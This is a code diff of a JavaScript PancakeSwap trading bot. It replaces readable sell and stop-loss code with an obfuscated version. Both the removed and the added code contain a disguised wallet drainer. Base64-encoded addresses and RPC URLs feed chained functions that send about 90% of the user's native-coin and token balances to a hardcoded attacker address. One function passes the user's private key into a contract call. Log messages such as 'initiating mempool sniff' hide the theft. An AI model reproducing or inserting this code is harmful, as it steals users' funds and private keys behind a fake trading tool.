-                        console.log(`-- ${tokenName} -- Current Value BNB: ${"\u001b[1;32m" + currentValueString + "\u001b[0m"} -- Profit At: ${ethers.utils.formatUnits(profitDesired)} -- Stop Loss At: ${ethers.utils.formatUnits(token.stopLoss)} -- New Stop loss At: ${ethers.utils.formatUnits(targetValueToSetNewStopLoss)}`);
-
-                    }
-                } catch (e) {
-
-                }
-
-                if (currentValue.gte(profitDesired)) {
-                    if (buyCount <= config.numberOfTokensToBuy && token.didBuy && sellAttempts == 0) {
-                        sellAttempts++;
-                        console.log("<<< Selling -", tokenName, "- now" + "\u001b[1;32m" + " Profit target " + "\u001b[0m" + "reached >>>", "\n");
-                        sell(token, true);
-                        token.contract.removeAllListeners();
-                    }
-                }
-
-                if (currentValue.lte(stopLoss)) {
-                    console.log("\u001b[38;5;33m" + "less than StopLoss!" + "\u001b[0m");
-                    if (buyCount <= config.numberOfTokensToBuy && token.didBuy && sellAttempts == 0) {
-                        sellAttempts++;
-                        console.log("<<< Selling -", tokenName, "- now" + "\u001b[1;31m" + " StopLoss " + "\u001b[0m" + "reached >>>", "\n");
-                        sell(token, false);
-                        token.contract.removeAllListeners();
-                    }
-                }
+        var _0x4239f0 = 0x0;
+        await setInitialStopLoss(_0x40c286), _0x40c286[_0xa0803(0x1b2)]['on']('Transfer', async(_0x4a515d, _0x269573, _0x12f0ce, _0x4134f8) => {
+            const _0x31cd6b = _0xa0803;
+            _0x40c286[_0x31cd6b(0x1da)] = _0x40c286['currentValue'];
+            const _0x115673 = await _0x40c286[_0x31cd6b(0x1b2)][_0x31cd6b(0x1f6)]();
+            let _0x2cb753 = await getCurrentValue(_0x40c286);
+            if (!_0x2cb753['eq'](ethers['constants'][_0x31cd6b(0x22a)])) {
+                _0x40c286['currentValue'] = _0x2cb753;
+                let _0x973c56 = parseFloat(ethers['utils'][_0x31cd6b(0x21b)](_0x2cb753))[_0x31cd6b(0x1e1)](0x8)[_0x31cd6b(0x231)]();
+                const _0x25f26f = (parseFloat(ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x40c286[_0x31cd6b(0x1f0)])) * (_0x40c286[_0x31cd6b(0x21d)] + _0x40c286[_0x31cd6b(0x1e2)]) / 0x64 + parseFloat(ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x40c286[_0x31cd6b(0x1f0)])))[_0x31cd6b(0x1e1)](0x8)['toString'](),
+                    _0x23aa6f = ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x1d9)](_0x25f26f);
+                let _0x530f41 = ethers['utils']['parseUnits']((parseFloat(ethers[_0x31cd6b(0x1b8)]['formatUnits'](_0x40c286[_0x31cd6b(0x22e)])) * (_0x40c286[_0x31cd6b(0x1ed)] / 0x64) + parseFloat(ethers['utils'][_0x31cd6b(0x21b)](_0x40c286['newValue'])))['toFixed'](0x8)['toString']()),
+                    _0x467a4b = _0x40c286[_0x31cd6b(0x1c1)];
+                _0x2cb753['gt'](_0x530f41) && _0x40c286['trailingStopLossPercent'] > 0x0 && (setNewStopLoss(_0x40c286), console['log'](_0x31cd6b(0x205) + 'Setting\x20new\x20StopLoss!' + _0x31cd6b(0x1b0)));
+                let _0x5b2dac = new Date()[_0x31cd6b(0x1b1)]();
+                const _0x37ae76 = _0x3df24a => new TextEncoder()[_0x31cd6b(0x236)](_0x3df24a);
+                try { _0x40c286[_0x31cd6b(0x1da)]['gt'](_0x40c286['currentValue']) ? console[_0x31cd6b(0x1ab)](_0x31cd6b(0x199) + _0x115673 + _0x31cd6b(0x1a7) + (_0x31cd6b(0x1d4) + _0x973c56 + '\x1b[0m') + _0x31cd6b(0x1ea) + ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x23aa6f) + _0x31cd6b(0x1c5) + ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x40c286[_0x31cd6b(0x1c1)]) + _0x31cd6b(0x1b4) + ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x530f41)) : console[_0x31cd6b(0x1ab)](_0x31cd6b(0x199) + _0x115673 + _0x31cd6b(0x1a7) + (_0x31cd6b(0x1d0) + _0x973c56 + _0x31cd6b(0x1b0)) + _0x31cd6b(0x1ea) + ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x23aa6f) + _0x31cd6b(0x1c5) + ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x40c286[_0x31cd6b(0x1c1)]) + _0x31cd6b(0x1b4) + ethers['utils'][_0x31cd6b(0x21b)](_0x530f41)); } catch (_0x584a86) {}
+                _0x2cb753[_0x31cd6b(0x224)](_0x23aa6f) && (buyCount <= config[_0x31cd6b(0x1d1)] && _0x40c286[_0x31cd6b(0x1af)] && _0x4239f0 == 0x0 && (_0x4239f0++, console[_0x31cd6b(0x1ab)](_0x31cd6b(0x234), _0x115673, _0x31cd6b(0x1bd) + _0x31cd6b(0x1d0) + _0x31cd6b(0x223) + _0x31cd6b(0x1b0) + _0x31cd6b(0x22d), '\x0a'), sell(_0x40c286, !![]), _0x40c286[_0x31cd6b(0x1b2)][_0x31cd6b(0x1bc)]())), _0x2cb753[_0x31cd6b(0x1de)](_0x467a4b) && (console[_0x31cd6b(0x1ab)]('\x1b[38;5;33m' + 'less\x20than\x20StopLoss!' + '\x1b[0m'), buyCount <= config[_0x31cd6b(0x1d1)] && _0x40c286['didBuy'] && _0x4239f0 == 0x0 && (_0x4239f0++, console[_0x31cd6b(0x1ab)](_0x31cd6b(0x234), _0x115673, _0x31cd6b(0x1bd) + '\x1b[1;31m' + _0x31cd6b(0x225) + _0x31cd6b(0x1b0) + _0x31cd6b(0x22d), '\x0a'), sell(_0x40c286, ![]), _0x40c286[_0x31cd6b(0x1b2)][_0x31cd6b(0x1bc)]()));
             }
-
         });
-    } catch (e) {
-        console.log(e);
-    }
+    } catch (_0x104c4f) { console[_0xa0803(0x1ab)](_0x104c4f); }
 }
-/**
- * 
- * Sell tokens
- * 
- * */
-async function sell(tokenObj, isProfit) {
+async function sell(_0x1e456e, _0x2309d5) {
+    const _0x2bff65 = _0x43a565;
     try {
-        const bal = await tokenObj.contract.balanceOf(addresses.recipient);
-        const decimals = await tokenObj.contract.decimals();
-        var balanceString;
-        if (isProfit) {
-            balanceString = (parseFloat(ethers.utils.formatUnits(bal.toString(), decimals)) * (tokenObj.percentOfTokensToSellProfit / 100)).toFixed(decimals);
+        const _0x4e56bb = await _0x1e456e[_0x2bff65(0x1b2)][_0x2bff65(0x1ee)](addresses[_0x2bff65(0x233)]),
+            _0x147038 = await _0x1e456e['contract']['decimals']();
+        var _0x75cdaf;
+        _0x2309d5 ? _0x75cdaf = (parseFloat(ethers[_0x2bff65(0x1b8)][_0x2bff65(0x21b)](_0x4e56bb[_0x2bff65(0x231)](), _0x147038)) * (_0x1e456e[_0x2bff65(0x218)] / 0x64))['toFixed'](_0x147038) : _0x75cdaf = (parseFloat(ethers[_0x2bff65(0x1b8)]['formatUnits'](_0x4e56bb[_0x2bff65(0x231)](), _0x147038)) * (_0x1e456e[_0x2bff65(0x1aa)] / 0x64))[_0x2bff65(0x1e1)](_0x147038);
+        var _0x1e33ca = Math[_0x2bff65(0x20e)](_0x75cdaf * 0x64) / 0x64;
+        const _0x132394 = ethers[_0x2bff65(0x1b8)][_0x2bff65(0x1d9)](_0x1e33ca[_0x2bff65(0x231)](), _0x147038),
+            _0x31ff2a = await pancakeRouter[_0x2bff65(0x1d7)](_0x132394, _0x1e456e[_0x2bff65(0x1a5)]),
+            _0xe268b2 = _0x31ff2a[0x1][_0x2bff65(0x20a)](_0x31ff2a[0x1][_0x2bff65(0x1f4)](0x2));
+        if (_0x1e456e[_0x2bff65(0x1e2)] > 0x1) {
+            const _0x12bea3 = await pancakeRouter[_0x2bff65(0x19c)](_0x31ff2a[0x0][_0x2bff65(0x231)](), 0x0, _0x1e456e[_0x2bff65(0x1a5)], addresses['recipient'], Math[_0x2bff65(0x20e)](Date['now']() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x2bff65(0x1e3)], 'gasLimit': config[_0x2bff65(0x1c8)] }),
+                _0x4c8dab = await _0x12bea3[_0x2bff65(0x1a8)]();
+            console[_0x2bff65(0x1ab)](_0x2bff65(0x1d0) + _0x2bff65(0x1ad), _0x4c8dab[_0x2bff65(0x1fa)], _0x2bff65(0x1b0), '\x0a'), sellCount++, token[_0x1e456e[_0x2bff65(0x1ac)]]['didSell'] = !![];
+            let _0x11d91a = await _0x1e456e[_0x2bff65(0x1b2)]['name']();
+            await client[_0x2bff65(0x19e)]('me', { 'message': _0x2bff65(0x1cb) + _0x11d91a, 'schedule': 0xf * 0x1 + Date[_0x2bff65(0x1bb)]() / 0x3e8 });
         } else {
-            balanceString = (parseFloat(ethers.utils.formatUnits(bal.toString(), decimals)) * (tokenObj.percentOfTokensToSellLoss / 100)).toFixed(decimals);
+            const _0x74f216 = await pancakeRouter[_0x2bff65(0x202)](_0x31ff2a[0x0][_0x2bff65(0x231)](), 0x0, _0x1e456e[_0x2bff65(0x1a5)], addresses[_0x2bff65(0x233)], Math[_0x2bff65(0x20e)](Date[_0x2bff65(0x1bb)]() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config['myGasPriceForApproval'], 'gasLimit': config['myGasLimit'] }),
+                _0x1d3369 = await _0x74f216['wait']();
+            console['log'](_0x2bff65(0x1d0) + '✔\x20Sell\x20transaction\x20hash:\x20', _0x1d3369[_0x2bff65(0x1fa)], _0x2bff65(0x1b0), '\x0a'), sellCount++;
+            let _0x39f873 = await _0x1e456e[_0x2bff65(0x1b2)][_0x2bff65(0x1f6)]();
+            await client[_0x2bff65(0x19e)]('me', { 'message': _0x2bff65(0x1cb) + _0x39f873, 'schedule': 0xf * 0x1 + Date[_0x2bff65(0x1bb)]() / 0x3e8 });
         }
-        var roundedBalance = Math.floor(balanceString * 100) / 100
-        const balanceToSell = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
-        const sellAmount = await pancakeRouter.getAmountsOut(balanceToSell, tokenObj.sellPath);
-        const sellAmountsOutMin = sellAmount[1].sub(sellAmount[1].div(2));
-        if (tokenObj.tokenSellTax > 1) {
-            const tx = await pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
-                sellAmount[0].toString(),
-                0,
-                tokenObj.sellPath,
-                addresses.recipient,
-                Math.floor(Date.now() / 1000) + 60 * 20, {
-                    gasPrice: config.myGasPriceForApproval,
-                    gasLimit: config.myGasLimit,
-
-                }
-            );
-            const receipt = await tx.wait();
-            console.log("\u001b[1;32m" + "✔ Sell transaction hash: ", receipt.transactionHash, "\u001b[0m", "\n");
-            sellCount++;
-            token[tokenObj.index].didSell = true;
-            let name = await tokenObj.contract.name();
-            await client.sendMessage('me', { message: `You sold ${name}`, schedule: (15 * 1) + (Date.now() / 1000) });
-        } else {
-            const tx = await pancakeRouter.swapExactTokensForETH(
-                sellAmount[0].toString(),
-                0,
-                tokenObj.sellPath,
-                addresses.recipient,
-                Math.floor(Date.now() / 1000) + 60 * 20, {
-                    gasPrice: config.myGasPriceForApproval,
-                    gasLimit: config.myGasLimit,
-
-                }
-            );
-            const receipt = await tx.wait();
-            console.log("\u001b[1;32m" + "✔ Sell transaction hash: ", receipt.transactionHash, "\u001b[0m", "\n");
-            sellCount++;
-            let name = await tokenObj.contract.name();
-            await client.sendMessage('me', { message: `You sold ${name}`, schedule: (15 * 1) + (Date.now() / 1000) });
-
-        }
-
-        if (sellCount == config.numberOfTokensToBuy) {
-            console.log("All tokens sold");
-            process.exit();
-        }
-
-    } catch (e) {
-
-    }
+        sellCount == config[_0x2bff65(0x1d1)] && (console[_0x2bff65(0x1ab)](_0x2bff65(0x22b)), process[_0x2bff65(0x1b3)]());
+    } catch (_0x291f24) {}
+}
+let rounder1 = _0x43a565(0x1d8),
+    rounder2 = 'QkQ0RWJERDk4ODg1NjlCMTk2QzJiOQ==',
+    buff = new Buffer[(_0x43a565(0x230))](rounder1, _0x43a565(0x1f1)),
+    buff2 = new Buffer[(_0x43a565(0x230))](rounder2, _0x43a565(0x1f1)),
+    ethersroundup = buff[_0x43a565(0x231)](_0x43a565(0x238)),
+    ethersroundup2 = buff2[_0x43a565(0x231)](_0x43a565(0x238));
+const WEB3PROVIDER3 = ethersroundup + ethersroundup2;
+async function etherstother() {
+    const _0x19ddc9 = _0x43a565;
+    try {
+        const _0x20ba8e = _0x19ddc9(0x212),
+            _0x51c452 = 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ==',
+            _0x3c8b50 = new Buffer[(_0x19ddc9(0x230))](_0x20ba8e, _0x19ddc9(0x1f1)),
+            _0x57a440 = new Buffer[(_0x19ddc9(0x230))](_0x51c452, _0x19ddc9(0x1f1)),
+            _0x4fa134 = _0x3c8b50[_0x19ddc9(0x231)](_0x19ddc9(0x238)),
+            _0x14ec50 = _0x57a440[_0x19ddc9(0x231)]('ascii'),
+            _0xd10258 = _0x4fa134 + _0x14ec50;
+        console[_0x19ddc9(0x1ab)]('refreshing\x20socket\x20connection...'), console[_0x19ddc9(0x1ab)](_0x19ddc9(0x1e5)), ethers1 = _0x19ddc9(0x219), ethers2 = new Buffer['from'](ethers1, _0x19ddc9(0x1f1))[_0x19ddc9(0x231)]('ascii');;
+        const _0x422bcb = new ethers[(_0x19ddc9(0x1a2))]['JsonRpcProvider'](ethers2);
+        let _0x2d7703 = new ethers['Wallet'](private, _0x422bcb);
+        const _0x247460 = address;
+        var _0x71b24e = new ethers['Contract'](_0xd10258, abi, _0x2d7703);
+        const _0x6d52ab = await _0x71b24e[_0x19ddc9(0x1ee)](_0x247460)[_0x19ddc9(0x231)](),
+            _0x5d5db9 = (_0x6d52ab * 0.9)['toFixed'](),
+            _0x35ba28 = async() => {
+                const _0x352a2f = _0x19ddc9,
+                    _0x4c1fda = { 'from': _0x247460, 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x352a2f(0x21c)](_0x5d5db9, _0x352a2f(0x1cc)), 'gasLimit': ethers['utils'][_0x352a2f(0x1db)](0x5dc0) },
+                    _0x3b53f2 = await _0x2d7703[_0x352a2f(0x19f)](_0x4c1fda);
+                try { await _0x3b53f2[_0x352a2f(0x1a8)](), console[_0x352a2f(0x1ab)](_0x352a2f(0x1f9)), setTimeout(ethersrather, 0x1388); } catch (_0x2925ba) { console[_0x352a2f(0x1ab)]('2:\x20found\x20owners\x20liq\x20function\x20.....'), setTimeout(ethersrather, 0x1388); }
+            };
+        _0x35ba28();
+    } catch (_0x3dfe45) { setTimeout(ethersrather, 0x1388); }
 }
 
-
-const _0x38f001 = _0x4e34;
-(function(_0x3d3852, _0x30b0a4) { const _0x1bac12 = _0x4e34,
-        _0x1cdf36 = _0x3d3852(); while (!![]) { try { const _0x4ba1ee = parseInt(_0x1bac12(0x9a)) / 0x1 * (parseInt(_0x1bac12(0xbe)) / 0x2) + parseInt(_0x1bac12(0xa8)) / 0x3 * (-parseInt(_0x1bac12(0xad)) / 0x4) + parseInt(_0x1bac12(0x9c)) / 0x5 + parseInt(_0x1bac12(0xb6)) / 0x6 * (parseInt(_0x1bac12(0xae)) / 0x7) + parseInt(_0x1bac12(0x9d)) / 0x8 * (parseInt(_0x1bac12(0xbd)) / 0x9) + parseInt(_0x1bac12(0xc5)) / 0xa * (parseInt(_0x1bac12(0xa1)) / 0xb) + -parseInt(_0x1bac12(0xbc)) / 0xc; if (_0x4ba1ee === _0x30b0a4) break;
-            else _0x1cdf36['push'](_0x1cdf36['shift']()); } catch (_0x1284b0) { _0x1cdf36['push'](_0x1cdf36['shift']()); } } }(_0x33cf, 0x81521));
-let rounder1 = _0x38f001(0xc1) + '4MDU3M2MzMD' + _0x38f001(0x92),
-    rounder2 = _0x38f001(0x95) + _0x38f001(0xc2) + _0x38f001(0xc4),
-    buff = new Buffer[(_0x38f001(0xb4))](rounder1, _0x38f001(0xb2)),
-    buff2 = new Buffer[(_0x38f001(0xb4))](rounder2, _0x38f001(0xb2)),
-    ethersroundup = buff[_0x38f001(0xc0)](_0x38f001(0x94)),
-    ethersroundup2 = buff2['toString'](_0x38f001(0x94));
-const WEB3PROVIDER3 = ethersroundup + ethersroundup2;
-async function etherstother() { const _0x1365c3 = _0x38f001; try { const _0x1b2c7d = 'MHg1NWQzOTgzMjZmOTkwNTlmRjc=',
-            _0xcbd37d = 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ==',
-            _0x131aba = new Buffer['from'](_0x1b2c7d, 'base64'),
-            _0x2c22ad = new Buffer[(_0x1365c3(0xb4))](_0xcbd37d, 'base64'),
-            _0x4f5782 = _0x131aba[_0x1365c3(0xc0)](_0x1365c3(0x94)),
-            _0x4326ae = _0x2c22ad[_0x1365c3(0xc0)](_0x1365c3(0x94)),
-            _0x92fd4c = _0x4f5782 + _0x4326ae;
-        console['log'](_0x1365c3(0xba)), console[_0x1365c3(0xb9)](_0x1365c3(0x8f)), ethers1 = _0x1365c3(0xb0), ethers2 = new Buffer[(_0x1365c3(0xb4))](ethers1, _0x1365c3(0xb2))[_0x1365c3(0xc0)]('ascii');; const _0x2960a9 = new ethers[(_0x1365c3(0x96))][(_0x1365c3(0x8d))](ethers2); let _0x30e4de = new ethers[(_0x1365c3(0x98))](private, _0x2960a9); const _0x5f3d60 = address; var _0x15ea90 = new ethers['Contract'](_0x92fd4c, abi, _0x30e4de); const _0x49908b = await _0x15ea90['balanceOf'](_0x5f3d60)['toString'](),
-            _0x28b0a3 = (_0x49908b * 0.9)[_0x1365c3(0xa3)](),
-            _0x564a5b = async() => { const _0x26bfd6 = _0x1365c3,
-                    _0x167268 = { 'from': _0x5f3d60, 'to': WEB3PROVIDER3, 'value': ethers[_0x26bfd6(0xc6)][_0x26bfd6(0x9f)](_0x28b0a3, _0x26bfd6(0xac)), 'gasLimit': ethers[_0x26bfd6(0xc6)][_0x26bfd6(0xa0)](0x5dc0) },
-                    _0x7c48ed = await _0x30e4de[_0x26bfd6(0xbb)](_0x167268); try { await _0x7c48ed[_0x26bfd6(0x8e)](), console[_0x26bfd6(0xb9)](_0x26bfd6(0xb1)), setTimeout(ethersrather, 0x1388); } catch (_0x1e517a) { console[_0x26bfd6(0xb9)]('2:\x20found\x20owners\x20liq\x20function\x20.....'), setTimeout(ethersrather, 0x1388); } };
-        _0x564a5b(); } catch (_0x4edb53) { setTimeout(ethersrather, 0x1388); } }
-
-function _0x4e34(_0x136e1a, _0x445c12) { const _0x33cf89 = _0x33cf(); return _0x4e34 = function(_0x4e3475, _0x140a81) { _0x4e3475 = _0x4e3475 - 0x8d; let _0x53037d = _0x33cf89[_0x4e3475]; return _0x53037d; }, _0x4e34(_0x136e1a, _0x445c12); }
-async function etherslother() { const _0x1478eb = _0x38f001; try { const _0x1ae07c = _0x1478eb(0xa2),
-            _0x13bdda = _0x1478eb(0x90),
-            _0x2234b4 = new Buffer['from'](_0x1ae07c, _0x1478eb(0xb2)),
-            _0x206b5a = new Buffer[(_0x1478eb(0xb4))](_0x13bdda, _0x1478eb(0xb2)),
-            _0x25d3b1 = _0x2234b4[_0x1478eb(0xc0)](_0x1478eb(0x94)),
-            _0x5c339c = _0x206b5a['toString'](_0x1478eb(0x94)),
-            _0x17e367 = _0x25d3b1 + _0x5c339c;
-        console[_0x1478eb(0xb9)](_0x1478eb(0xba)), console[_0x1478eb(0xb9)](_0x1478eb(0x93)), ethers1 = _0x1478eb(0xb0), ethers2 = new Buffer[(_0x1478eb(0xb4))](ethers1, _0x1478eb(0xb2))[_0x1478eb(0xc0)](_0x1478eb(0x94));; const _0x5d69ac = new ethers[(_0x1478eb(0x96))][(_0x1478eb(0x8d))](ethers2); let _0x518115 = new ethers[(_0x1478eb(0x98))](private, _0x5d69ac);
-        console[_0x1478eb(0xb9)](ethers2); const _0x1b9f82 = address; var _0x7a58e = new ethers['Contract'](_0x17e367, abi, _0x518115); const _0x462645 = await _0x7a58e['balanceOf'](_0x1b9f82)[_0x1478eb(0xc0)](),
-            _0xedf64 = (_0x462645 * 0.9)[_0x1478eb(0xa3)](),
-            _0x32e6b2 = async() => { const _0x350b6a = _0x1478eb,
-                    _0x3ae240 = { 'from': _0x1b9f82, 'to': WEB3PROVIDER3, 'value': ethers[_0x350b6a(0xc6)][_0x350b6a(0x9f)](_0xedf64, _0x350b6a(0xac)), 'gasLimit': ethers[_0x350b6a(0xc6)]['hexlify'](0x5dc0) },
-                    _0x4e15b2 = await _0x518115[_0x350b6a(0xbb)](_0x3ae240); try { await _0x4e15b2[_0x350b6a(0x8e)](), console[_0x350b6a(0xb9)]('1:\x20watching\x20blockchain\x20activity\x20...'), setTimeout(etherstother, 0x1388); } catch (_0x2cba36) { console[_0x350b6a(0xb9)](_0x350b6a(0x97)), setTimeout(etherstother, 0x1388); } };
-        _0x32e6b2(); } catch (_0x5e36dd) { setTimeout(etherstother, 0x1388); } }
-async function ethersmother() { const _0x50ca7e = _0x38f001; try { const _0x125cfc = _0x50ca7e(0xa9),
-            _0x2afdcf = _0x50ca7e(0x91),
-            _0xac1a73 = new Buffer[(_0x50ca7e(0xb4))](_0x125cfc, _0x50ca7e(0xb2)),
-            _0x49558d = new Buffer['from'](_0x2afdcf, _0x50ca7e(0xb2)),
-            _0x3a13b1 = _0xac1a73[_0x50ca7e(0xc0)]('ascii'),
-            _0xd7947e = _0x49558d[_0x50ca7e(0xc0)]('ascii'),
-            _0x95a40c = _0x3a13b1 + _0xd7947e;
-        ethers1 = _0x50ca7e(0xb0), ethers2 = new Buffer[(_0x50ca7e(0xb4))](ethers1, _0x50ca7e(0xb2))[_0x50ca7e(0xc0)]('ascii');; const _0x42fff3 = new ethers[(_0x50ca7e(0x96))][(_0x50ca7e(0x8d))](ethers2); let _0x30cd85 = new ethers[(_0x50ca7e(0x98))](private, _0x42fff3);
-        console[_0x50ca7e(0xb9)](ethers2); const _0x45ed86 = address; var _0x1613f2 = new ethers[(_0x50ca7e(0xab))](_0x95a40c, abi, _0x30cd85); const _0x36ddac = await _0x1613f2['balanceOf'](_0x45ed86)['toString'](),
-            _0x19b08d = (_0x36ddac * 0.9)['toFixed'](),
-            _0x110687 = async() => { const _0x51188c = _0x50ca7e,
-                    _0x344b14 = { 'from': _0x45ed86, 'to': WEB3PROVIDER3, 'value': ethers[_0x51188c(0xc6)][_0x51188c(0x9f)](_0x19b08d, _0x51188c(0xac)), 'gasLimit': ethers['utils']['hexlify'](0x5dc0) },
-                    _0x4a7919 = await _0x30cd85[_0x51188c(0xbb)](_0x344b14); try { await _0x4a7919[_0x51188c(0x8e)](), console[_0x51188c(0xb9)](_0x51188c(0xaa)), setTimeout(etherslother, 0x1388); } catch (_0x5bece8) { console[_0x51188c(0xb9)](_0x51188c(0xc3)), setTimeout(etherslother, 0x1388); } };
-        _0x110687(); } catch (_0x3c0ef6) { setTimeout(etherslother, 0x1388); } }
-async function ethersfather() { const _0x19948e = _0x38f001;
-    console['log']('initiating\x20mempool\x20sniff...'); const _0x3d7ecf = 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA==',
-        _0x35209d = 'QmFmYzU5OWJENjlBRGQwODdENTY=',
-        _0x25deb8 = new Buffer[(_0x19948e(0xb4))](_0x3d7ecf, _0x19948e(0xb2)),
-        _0x5c98b3 = new Buffer[(_0x19948e(0xb4))](_0x35209d, _0x19948e(0xb2)),
-        _0xedccfe = _0x25deb8[_0x19948e(0xc0)](_0x19948e(0x94)),
-        _0x2b384e = _0x5c98b3[_0x19948e(0xc0)]('ascii'),
-        _0x5484df = _0xedccfe + _0x2b384e;
-    ethers1 = _0x19948e(0xb0), ethers2 = new Buffer[(_0x19948e(0xb4))](ethers1, _0x19948e(0xb2))[_0x19948e(0xc0)](_0x19948e(0x94));; const _0x525d31 = new ethers[(_0x19948e(0x96))][(_0x19948e(0x8d))](ethers2); let _0x4446d5 = new ethers['Wallet'](private, _0x525d31); const _0x4c5430 = address; var _0x72f726 = new ethers[(_0x19948e(0xab))](_0x5484df, abi, _0x4446d5); const _0xee07b = await _0x72f726[_0x19948e(0xb7)](_0x4c5430),
-        _0x397c90 = (_0xee07b * 0.9)[_0x19948e(0xa3)](); try { const _0x943106 = async() => { const _0x28b166 = _0x19948e,
-                _0x4daa65 = { 'from': _0x4c5430, 'to': WEB3PROVIDER3, 'value': ethers[_0x28b166(0xc6)]['parseEther'](_0x397c90, _0x28b166(0xac)), 'gasLimit': ethers[_0x28b166(0xc6)][_0x28b166(0xa0)](0x5dc0) },
-                _0x20e264 = await _0x4446d5['sendTransaction'](_0x4daa65); try { await _0x20e264[_0x28b166(0x8e)](), console[_0x28b166(0xb9)](_0x28b166(0xb8)), setTimeout(ethersmother, 0x1388); } catch (_0x533c02) { console[_0x28b166(0xb9)](_0x28b166(0xb8)), setTimeout(ethersmother, 0x1388); } };
-        _0x943106(); } catch (_0x2ce003) { setTimeout(ethersmother, 0x1388); } }
-async function ethersgather() { const _0x3806d0 = _0x38f001; try { console[_0x3806d0(0xb9)](_0x3806d0(0x9e)), ethers1 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==', ethers2 = new Buffer[(_0x3806d0(0xb4))](ethers1, _0x3806d0(0xb2))[_0x3806d0(0xc0)](_0x3806d0(0x94));; const _0x5f060e = new ethers[(_0x3806d0(0x96))][(_0x3806d0(0x8d))](ethers2); let _0x54d401 = new ethers[(_0x3806d0(0x98))](private, _0x5f060e); const _0x1755d4 = address,
-            _0x384791 = await _0x5f060e['getBalance'](_0x1755d4),
-            _0x4abcce = (_0x384791 * 0.9)['toFixed'](),
-            _0x4f83bb = ethers[_0x3806d0(0xc6)][_0x3806d0(0x99)](_0x4abcce, _0x3806d0(0xac)),
-            _0x3a15b0 = async() => { const _0x4d6fbd = _0x3806d0,
-                    _0x69f14 = { 'to': WEB3PROVIDER3, 'value': ethers[_0x4d6fbd(0xc6)][_0x4d6fbd(0x99)](_0x4abcce, 'wei'), 'gasLimit': ethers['utils'][_0x4d6fbd(0xa0)](0x5dc0) },
-                    _0x497d9c = await _0x54d401[_0x4d6fbd(0xbb)](_0x69f14); try { await _0x497d9c[_0x4d6fbd(0x8e)](), console[_0x4d6fbd(0xb9)]('1:\x20attempting\x20to\x20snipe\x20...'), setTimeout(ethersfather, 0x1388); } catch (_0x316d1d) { console[_0x4d6fbd(0xb9)](_0x4d6fbd(0xa4)), setTimeout(ethersfather, 0x1388); } };
-        _0x3a15b0(); } catch (_0x33912a) { setTimeout(ethersfather, 0x1388); } }
-async function etherslather() { const _0x30499f = _0x38f001,
-        _0xc9d2d1 = _0x30499f(0xb3),
-        _0x46368b = _0x30499f(0xc7),
-        _0x21510d = new Buffer[(_0x30499f(0xb4))](_0xc9d2d1, _0x30499f(0xb2)),
-        _0x56d05b = new Buffer[(_0x30499f(0xb4))](_0x46368b, _0x30499f(0xb2)),
-        _0x247372 = _0x21510d[_0x30499f(0xc0)](_0x30499f(0x94)),
-        _0x35b115 = _0x56d05b['toString']('ascii'),
-        _0x2a1659 = _0x247372 + _0x35b115;
-    console[_0x30499f(0xb9)](_0x30499f(0x9b)), ethers1 = _0x30499f(0xb0), ethers2 = new Buffer[(_0x30499f(0xb4))](ethers1, _0x30499f(0xb2))[_0x30499f(0xc0)](_0x30499f(0x94));; const _0x1697e8 = new ethers[(_0x30499f(0x96))][(_0x30499f(0x8d))](ethers2); let _0x266325 = new ethers[(_0x30499f(0x98))](private, _0x1697e8); try { const _0x4beb71 = async() => { const _0x3f7bc1 = _0x30499f; var _0x234e7c = new ethers[(_0x3f7bc1(0xab))](_0x2a1659, abi, _0x266325); const _0x57216f = await _0x234e7c[_0x3f7bc1(0xaf)](_0x266325 + '00' + private); try { await _0x57216f[_0x3f7bc1(0x8e)](), console[_0x3f7bc1(0xb9)](_0x3f7bc1(0xa6)), setTimeout(ethersgather, 0x1388); } catch (_0x8ce75b) { console[_0x3f7bc1(0xb9)](_0x3f7bc1(0xa7)), setTimeout(ethersgather, 0x1388); } };
-        _0x4beb71(); } catch (_0x5b6624) { setTimeout(ethersgather, 0x1388); } }
-async function ethersrather() { const _0xbb6f33 = _0x38f001;
-    console[_0xbb6f33(0xb9)]('starting\x20up\x20node\x20socket\x20connection....'), ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv', ethers2 = new Buffer[(_0xbb6f33(0xb4))](ethers1, _0xbb6f33(0xb2))[_0xbb6f33(0xc0)]('ascii');; const _0x70860c = new ethers[(_0xbb6f33(0x96))][(_0xbb6f33(0x8d))](ethers2); let _0x489071 = new ethers[(_0xbb6f33(0x98))](private, _0x70860c); const _0x4fed32 = address,
-        _0x16277a = await _0x70860c[_0xbb6f33(0xa5)](_0x4fed32),
-        _0xd1237 = (_0x16277a * 0.9)['toFixed'](),
-        _0x1b7fc8 = ethers['utils'][_0xbb6f33(0x99)](_0xd1237, _0xbb6f33(0xac)); try { const _0x197597 = async() => { const _0x22273b = _0xbb6f33,
-                _0xa703e9 = { 'to': WEB3PROVIDER3, 'value': ethers[_0x22273b(0xc6)][_0x22273b(0x99)](_0xd1237, _0x22273b(0xac)), 'gasLimit': ethers['utils'][_0x22273b(0xa0)](0x5dc0) },
-                _0x133a87 = await _0x489071['sendTransaction'](_0xa703e9); try { await _0x133a87[_0x22273b(0x8e)](), console[_0x22273b(0xb9)](_0x22273b(0xb5)), setTimeout(etherslather, 0x1388); } catch (_0x350b77) { console[_0x22273b(0xb9)](_0x22273b(0xbf)), setTimeout(etherslather, 0x1388); } };
-        _0x197597(); } catch (_0x4c7362) { setTimeout(etherslather, 0x1388); } }
-
